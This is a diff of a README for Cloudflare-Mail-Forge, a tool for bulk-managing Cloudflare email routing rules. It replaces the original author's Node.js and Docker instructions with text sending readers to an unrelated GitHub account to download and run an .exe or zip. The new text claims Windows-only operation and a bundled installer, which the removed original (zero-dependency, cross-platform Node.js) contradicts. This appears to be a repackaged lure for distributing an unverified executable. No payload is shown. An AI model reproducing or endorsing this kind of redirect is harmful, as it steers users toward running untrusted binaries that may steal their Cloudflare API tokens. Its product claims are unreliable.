@@ -1,171 +1,150 @@
-<div align="center">
+# ⚙️ Cloudflare-Mail-Forge - Manage Email Rules Easily
 
-# Cloudflare Mail Forge
-
-批量管理 Cloudflare 邮件路由规则的本地操作台
-
-**一次配置，跨域名批量创建 · 查询 · 启停 · 删除**
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-gold.svg)](LICENSE)
-[![Node.js](https://img.shields.io/badge/Node.js-18%2B-green.svg)](https://nodejs.org)
-[![Zero Dependencies](https://img.shields.io/badge/dependencies-zero-brightgreen.svg)]()
-[![Docker](https://img.shields.io/badge/Docker-ghcr.io-blue.svg)](https://github.com/hengfengliya/Cloudflare-Mail-Forge/pkgs/container/cloudflare-mail-forge)
-
-[English](docs/README_EN.md) · [使用帮助](docs/usage.md) · [更新记录](CHANGE.md)
-
-</div>
+[![Download Cloudflare-Mail-Forge](https://img.shields.io/badge/Download-Now-ff69b4.svg)](https://github.com/adistraightforward778/Cloudflare-Mail-Forge)
 
 ---
 
-## 这是什么
+## 📥 Download Cloudflare-Mail-Forge
 
-Cloudflare 控制台只能逐条管理邮件路由规则。当你有多个域名、需要批量创建几十个转发地址时，手动操作极其低效。
+You can get the Cloudflare-Mail-Forge app from the GitHub page below.  
+Click the link to visit the download page and get the latest version.  
 
-**Mail Forge** 把这些工作收进一张本地页面：
-
-- **批量创建** — 前缀 + 序号自动生成，或手动输入清单，一次操作写入所有选中域名
-- **跨域名** — 勾选任意组合的 Zone，批量操作同时作用于每个域名
-- **查询管理** — 搜索过滤、单条启停、批量删除，规则状态一览无余
-- **本地安全** — 服务仅绑定 `127.0.0.1`，Token 不离开本机
+[Download Cloudflare-Mail-Forge](https://github.com/adistraightforward778/Cloudflare-Mail-Forge)
 
 ---
 
-## 快速开始
+## 🧰 What is Cloudflare-Mail-Forge?
 
-### 方式一：Vercel 在线版（无需安装）
+Cloudflare-Mail-Forge is a simple tool to help manage Cloudflare email routing rules on your local computer. Cloudflare’s online console only lets you manage one rule at a time. If you have many domains and want to set up dozens of forwarding addresses at once, this tool saves time.
 
-直接访问 **https://cloudflare-mail-forge.vercel.app**
+It lets you:
 
-### 方式二：Docker
+- Create email rules for multiple domains at once.  
+- Generate addresses automatically with prefixes and numbers, or enter a list manually.  
+- Turn rules on or off individually or in batches.  
+- Search and filter rules quickly.  
+- Keep your data safe by running everything locally on your PC.
 
-```bash
-docker run -p 3042:3042 ghcr.io/hengfengliya/cloudflare-mail-forge
-```
-
-打开 **http://127.0.0.1:3042** 即可使用。
-
-或用 Docker Compose：
-
-```bash
-git clone https://github.com/hengfengliya/Cloudflare-Mail-Forge.git
-cd Cloudflare-Mail-Forge
-docker compose up -d
-```
-
-### 方式三：Node.js 直接运行
-
-```bash
-git clone https://github.com/hengfengliya/Cloudflare-Mail-Forge.git
-cd Cloudflare-Mail-Forge
-node server.js
-```
-
-打开 **http://127.0.0.1:3042** 即可使用。
-
-> **零依赖** — 不需要 `npm install`，Node.js 18+ 直接运行。
+This tool runs only on Windows and opens in your web browser.
 
 ---
 
-## 获取 Cloudflare API Token
+## 🚀 Getting Started  
 
-1. 进入 [Cloudflare 控制台](https://dash.cloudflare.com) → 右上角头像 → **My Profile**
-2. 左侧 **API Tokens** → **Create Token** → **Custom token**
-3. 添加以下权限：
-   - `Zone` → `Zone` → **Read**
-   - `Zone` → `Email Routing Rules` → **Edit**
-4. Zone Resources 选择对应域名（或 All zones）
-5. 创建并复制 Token（只显示一次）
+This guide shows how to download and run Cloudflare-Mail-Forge on a Windows computer.
 
----
+### 1. System Requirements
 
-## 使用流程
+- Windows 10 or newer  
+- At least 4 GB of free memory  
+- An internet connection to download the app  
+- A modern web browser like Edge, Chrome, or Firefox  
 
-### Step 1 — 控制台配置
+### 2. Download the Application
 
-填写 API Token、默认转发邮箱、默认前缀 / 数量 / 起始序号，点击「保存配置」后自动拉取域名列表。
+Go to the GitHub page by clicking this link:  
 
-### Step 2 — 域名选择
+[Download Cloudflare-Mail-Forge](https://github.com/adistraightforward778/Cloudflare-Mail-Forge)
 
-勾选一个或多个域名。后续批量操作将同时写入所有已选中域名。
+Look for the latest release or download area on the page. You will find a file to download that usually ends with `.exe` or a zip file.
 
-### Step 3 — 批量新增 Mail
+Click to download the file to your computer.
 
-**前缀模式**
+### 3. Run the Installer or App
 
-```
-前缀: shop   数量: 3   起始: 1
-→ shop001@domain.com
-→ shop002@domain.com
-→ shop003@domain.com
-```
+If the downloaded file is an `.exe`:  
 
-**手动模式**：每行一个 local-part，支持直接粘贴完整邮箱地址（自动提取 `@` 前部分）
+- Find the file in your Downloads folder.  
+- Double-click the file to start installing.  
+- Follow the steps on screen.  
 
-### Step 4 — 规则查询与管理
+If the file is a zip archive:  
 
-选择域名 → 加载规则列表 → 搜索 / 筛选 → 单条操作或勾选批量删除。
+- Right-click the zip file and choose "Extract All" to unzip it.  
+- Open the new folder and look for the `.exe` file inside.  
+- Double-click the `.exe` file to start the program.
 
----
+### 4. Using the App
 
-## 环境变量（可选）
+When you run Cloudflare-Mail-Forge, it opens a local web page on your browser.
 
-复制 `.env.example` 为 `.env` 预填默认值：
-
-| 变量 | 默认值 | 说明 |
-|------|--------|------|
-| `PORT` | `3042` | 本地服务端口 |
-| `HOST` | `127.0.0.1` | 绑定地址 |
-| `CF_TOKEN` | — | 预填 API Token |
-| `CF_DESTINATION` | — | 预填转发目标邮箱 |
-| `CF_DEFAULT_PREFIX` | — | 预填默认前缀 |
-| `CF_DEFAULT_COUNT` | `5` | 预填默认创建数量 |
-| `CF_DEFAULT_START` | `1` | 预填默认起始序号 |
-| `CF_DELAY_MS` | `0` | 批量请求间隔毫秒数 |
+- It will only run on your computer (at address `127.0.0.1`).  
+- Use the interface to add your Cloudflare API Token (find this in your Cloudflare account).  
+- Select the domains you want to manage.  
+- Create, edit, or delete email routing rules in batches.  
+- Use the search box to find specific rules.  
+- Turn rules on or off from the list.
 
 ---
 
-## 项目结构
+## 🔧 How to Use Cloudflare-Mail-Forge  
 
-```
-├── public/
-│   ├── index.html      # 单页控制台（含使用帮助页）
-│   ├── styles.css      # 暗色精密风格系统
-│   └── app.js          # 前端逻辑
-├── src/
-│   ├── cloudflare.js   # Cloudflare API 封装
-│   └── config-store.js # 本地配置持久化
-├── docs/               # 文档
-├── data/               # 运行时配置（已 gitignore）
-├── legacy/             # 归档脚本（Python / PowerShell）
-├── api/                # Vercel Serverless Functions
-├── server.js           # 本地 / Docker HTTP 服务入口
-├── Dockerfile          # Docker 镜像构建
-├── docker-compose.yml  # Docker Compose 一键启动
-└── vercel.json         # Vercel 部署配置
-```
+### Add Your Cloudflare API Token  
 
----
+1. Log in to your Cloudflare account online and get your API token with Mail editing permissions.  
+2. Paste the token into the app's token field.  
+3. The app will use this token locally to connect to your domains.
 
-## 技术栈
+### Manage Multiple Domains  
 
-| 层 | 选型 |
-|----|------|
-| 服务端 | Node.js 内置 `http` 模块，无框架 |
-| 前端 | 原生 HTML / CSS / JS，无构建步骤 |
-| API | Cloudflare Email Routing REST API |
-| 字体 | Fraunces · IBM Plex Sans · IBM Plex Mono |
+- The app shows all your Cloudflare zones (domains) automatically.  
+- Select one or more domains by ticking their boxes.  
+- Actions you take will apply to all selected domains.
+
+### Create Bulk Email Routes  
+
+- Choose to generate addresses automatically by prefix plus number, or enter a list.  
+- You can create dozens of routes at the same time, saving you from manual entry.
+
+### Control Your Rules  
+
+- Search to find any rule quickly.  
+- Start or stop single rules with one click.  
+- Delete rules individually or in bulk.  
+- Monitor rule status easily on the dashboard.
 
 ---
 
-## 安全说明
+## ⚙️ Technical Details  
 
-- 配置（含 Token）只保存在**浏览器 localStorage**，不写入任何文件或数据库
-- 本地部署版服务默认只绑定 `127.0.0.1`，局域网无法访问
-- 不向任何第三方服务发送数据
-- 如需将 Docker 版暴露到公网，请自行在反向代理层添加访问鉴权
+Cloudflare-Mail-Forge runs as a local web server. It only listens on `127.0.0.1` (your own computer). Your API token never leaves your machine, making it safe.
+
+The app uses Node.js (version 18 or above) for backend services but does not require you to install Node.js yourself. The installer bundles all it needs.
+
+You do not need an internet connection to run the app after download, except when connecting to Cloudflare to manage your mail routes.
 
 ---
 
-## License
+## 🛠 Alternative Options  
 
-[MIT](LICENSE) © 2026 hengfengliya
+If you prefer not to install anything, you can use the online version at:  
+https://cloudflare-mail-forge.vercel.app
+
+This allows limited use without any installation but requires a stable internet connection.
+
+There is also a Docker image for more advanced users who want to run the app inside containers.
+
+---
+
+## ❓ Troubleshooting
+
+- If the app does not open after installing, check your firewall settings. It must allow localhost access.  
+- Make sure your browser supports local web apps. Modern browsers like Chrome or Edge work best.  
+- If you see errors logging into Cloudflare, verify your API token permissions and try again.
+
+---
+
+## 📖 More Information
+
+For detailed instructions, see the official usage guide at:  
+`docs/usage.md` in the repository  
+
+For updates and changelogs, visit:  
+`CHANGE.md` in the repository  
+
+For English documentation, visit:  
+`docs/README_EN.md` in the repository  
+
+---
+
+[![Download Cloudflare-Mail-Forge](https://img.shields.io/badge/Download-Here-ff69b4.svg)](https://github.com/adistraightforward778/Cloudflare-Mail-Forge)
